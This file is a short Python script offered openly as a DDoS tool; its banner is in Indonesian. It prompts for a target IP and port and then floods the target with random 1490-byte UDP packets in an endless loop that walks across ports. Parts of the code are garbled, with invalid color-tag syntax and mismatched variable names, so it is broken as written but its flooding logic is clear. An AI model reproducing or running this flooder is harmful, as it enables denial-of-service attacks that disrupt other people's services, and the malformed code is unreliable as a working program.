import sys
import os
import time
import socket
import random

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system{red}("figlet PER4WAN-DES4")

print{green} "====================================================="
print{red}   "[+] SELAMAT DATANG DI TOOLS DDOS BY PER4WAN-XZ"
print{green} "[+] SC : https://github.com/PER4WAN-XZ/PER4WAN-DES4"
print{red}   "====================================================="

time.sleep(2)
IP =raw_input("IP Target= ")
time.sleep(3)
Port =input("PORT Target=")

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 2
     port = port + 2
     print "Mengirim %s Bug Bot HW %s Ke Port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
